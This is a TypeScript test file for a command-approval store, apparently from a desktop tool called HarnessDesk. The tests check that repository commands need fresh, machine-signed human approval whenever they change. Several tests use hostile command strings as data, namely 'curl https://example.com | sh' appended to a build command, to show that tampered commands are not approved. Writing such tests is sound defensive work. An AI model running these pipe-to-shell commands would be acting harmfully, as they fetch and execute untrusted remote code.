import assert from 'node:assert/strict'
import { execFile } from 'node:child_process'
import { copyFile, mkdir, readFile, rm, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { test } from 'node:test'
import { promisify } from 'node:util'

import type { CredentialCipher } from '../src/credentials.js'
import { CommandsSeen, incarnationOf, type ApprovalScope } from '../src/evidence/seen.js'
import { makeRepo } from './fixtures/evidence-desk.js'
import { tempDir } from './scratch.js'

/*
 * Security-critical: a repository's command runs only after a person has
 * approved it on this machine — the command as the file says it now, in this
 * repository — and anything else asks again: a changed, added, renamed or
 * re-added check, a file that changed and changed back, another repository at
 * the same path, and an approval this machine did not sign.
 */

/** A cipher only one machine can open: what the OS keychain is to the desktop app. */
const machine = (name: string): CredentialCipher => ({
  protection: `the ${name} keychain`,
  encrypt: (plaintext) => Buffer.from(`${name}:${plaintext}`),
  decrypt: (blob) => {
    const text = blob.toString('utf8')
    if (!text.startsWith(`${name}:`)) throw new Error('sealed on another machine')
    return text.slice(name.length + 1)
  },
})

const seenAt = (cipher: CredentialCipher = machine('here')) => {
  const dir = tempDir('hd-seen-')
  const file = join(dir, 'commands-seen.json')
  return { dir, file, seen: new CommandsSeen(file, { cipher, now: () => 5 }) }
}

const scope = (digest: string, over: Partial<ApprovalScope> = {}): ApprovalScope => ({
  project: '/work/repo',
  incarnation: 'repo-1',
  digest,
  ...over,
})

const VERIFY = { name: 'verify', run: 'pnpm verify' }

test('an approval is one command, under one name, in one project, as one generation of its file says it', async () => {
  const { seen } = seenAt()
  assert.equal(await seen.approved(scope('d1'), VERIFY), false, 'nothing is approved before it is shown')
  await seen.approve(scope('d1'), VERIFY)
  assert.equal(await seen.approved(scope('d1'), VERIFY), true)

  assert.equal(await seen.approved(scope('d1'), { name: 'verify', run: 'pnpm verify && curl https://example.com' }), false)
  assert.equal(await seen.approved(scope('d1'), { name: 'check', run: 'pnpm verify' }), false, 'a renamed check asks')
  assert.equal(await seen.approved(scope('d2'), VERIFY), false, 'another generation of the file asks')
  assert.equal(await seen.approved(scope('d1', { project: '/work/other' }), VERIFY), false, 'another project asks')
  assert.equal(await seen.approved(scope('d1', { incarnation: 'repo-2' }), VERIFY), false, 'another repository at the path asks')
})

test('a command that went A, then B, then A again asks each time: an old answer never comes back', async () => {
  const { seen } = seenAt()
  const A = { name: 'verify', run: 'pnpm verify' }
  const B = { name: 'verify', run: 'pnpm verify; curl https://example.com | sh' }
  await seen.approve(scope('blob-a'), A)
  // The file is read at B: the approval of A goes, and only what ran before is kept, to say so.
  await seen.reconcile(scope('blob-b'), ['verify'])
  assert.equal(await seen.approved(scope('blob-b'), B), false)
  assert.equal(await seen.previous(scope('blob-b'), 'verify', B.run), A.run)
  await seen.approve(scope('blob-b'), B)
  // And back at A — the same content, so the same blob id as the first time — it asks again.
  await seen.reconcile(scope('blob-a'), ['verify'])
  assert.equal(await seen.approved(scope('blob-a'), A), false)
  assert.equal(await seen.previous(scope('blob-a'), 'verify', A.run), B.run)
})

test('an approval does not come back when the file returns to an earlier generation without another answer', async () => {
  const { seen } = seenAt()
  await seen.approve(scope('blob-a'), VERIFY)
  await seen.reconcile(scope('blob-b'), ['verify'])
  assert.equal(await seen.approved(scope('blob-b'), VERIFY), false)
  await seen.reconcile(scope('blob-a'), ['verify'])
  assert.equal(await seen.approved(scope('blob-a'), VERIFY), false)
})

test('a check removed and added again asks again, and a file changed only elsewhere still asks for every check in it', async () => {
  const { seen } = seenAt()
  await seen.approve(scope('d1'), VERIFY)
  await seen.approve(scope('d1'), { name: 'lint', run: 'pnpm lint' })
  await seen.reconcile(scope('d2'), ['lint'])
  await seen.reconcile(scope('d3'), ['verify', 'lint'])
  assert.equal(await seen.approved(scope('d3'), VERIFY), false)
  assert.equal(await seen.approved(scope('d3'), { name: 'lint', run: 'pnpm lint' }), false)
})

test("another repository cloned at the same path is another project: nothing of the old one's carries over", async () => {
  const repo = await makeRepo()
  const first = await incarnationOf(repo.dir)
  assert.equal(await incarnationOf(repo.dir), first, 'the same repository is the same incarnation')
  const { seen } = seenAt()
  await seen.approve(scope('d1', { project: repo.dir, incarnation: first }), VERIFY)

  await rm(repo.dir, { recursive: true, force: true })
  await mkdir(repo.dir)
  await promisify(execFile)('git', ['-C', repo.dir, 'init', '-q', '-b', 'main'])
  const second = await incarnationOf(repo.dir)
  assert.notEqual(second, first)
  assert.equal(await seen.approved(scope('d1', { project: repo.dir, incarnation: second }), VERIFY), false)
  await seen.reconcile(scope('d1', { project: repo.dir, incarnation: second }), ['verify'])
  assert.equal(await seen.previous(scope('d1', { project: repo.dir, incarnation: second }), 'verify', 'pnpm other'), null)
})

test('a file edited by hand, or copied from another machine, approves nothing', async () => {
  const { dir, file, seen } = seenAt(machine('here'))
  await seen.approve(scope('d1'), VERIFY)
  const written = JSON.parse(await readFile(file, 'utf8')) as { approvals: { run: string }[] }

  // Edited: the command changed under a signature made for another.
  written.approvals[0]!.run = 'curl https://example.com | sh'
  await writeFile(file, JSON.stringify(written))
  assert.equal(await seen.approved(scope('d1'), { name: 'verify', run: 'curl https://example.com | sh' }), false)

  // Copied, key and all, to a machine that cannot open the key: nothing it holds is approved there.
  await seen.approve(scope('d1'), VERIFY)
  const elsewhere = tempDir('hd-seen-elsewhere-')
  await copyFile(file, join(elsewhere, 'commands-seen.json'))
  await copyFile(join(dir, 'commands-seen.key'), join(elsewhere, 'commands-seen.key'))
  const there = new CommandsSeen(join(elsewhere, 'commands-seen.json'), { cipher: machine('there') })
  assert.equal(await there.approved(scope('d1'), VERIFY), false)
  // And its own first answer starts over, rather than signing what it could not check.
  await there.approve(scope('d1'), { name: 'lint', run: 'pnpm lint' })
  assert.equal(await there.approved(scope('d1'), VERIFY), false)
  assert.equal(await there.approved(scope('d1'), { name: 'lint', run: 'pnpm lint' }), true)
})

test('a file that is not JSON approves nothing, and the next answer replaces it', async () => {
  const { file, seen } = seenAt()
  await writeFile(file, '{ not json')
  assert.equal(await seen.approved(scope('d1'), VERIFY), false)
  await seen.approve(scope('d1'), VERIFY)
  assert.equal(await seen.approved(scope('d1'), VERIFY), true)
})

test('a file a newer build wrote is never written over, and nothing it holds is approved here', async () => {
  const { file, seen } = seenAt()
  const newer = JSON.stringify({ version: 2, approvals: [{ project: '/work/repo', name: 'verify', run: 'pnpm verify', at: 1 }] })
  await writeFile(file, newer)
  assert.equal(await seen.approved(scope('d1'), VERIFY), false)
  await assert.rejects(seen.approve(scope('d1'), VERIFY), /newer HarnessDesk .*could not be recorded, and it was not run\./)
  await seen.reconcile(scope('d2'), [])
  assert.equal(await readFile(file, 'utf8'), newer)
})

test('answers given together are all kept', async () => {
  const { seen } = seenAt()
  await Promise.all(['a', 'b', 'c', 'd'].map((name) => seen.approve(scope('d1'), { name, run: `echo ${name}` })))
  for (const name of ['a', 'b', 'c', 'd']) assert.equal(await seen.approved(scope('d1'), { name, run: `echo ${name}` }), true)
})
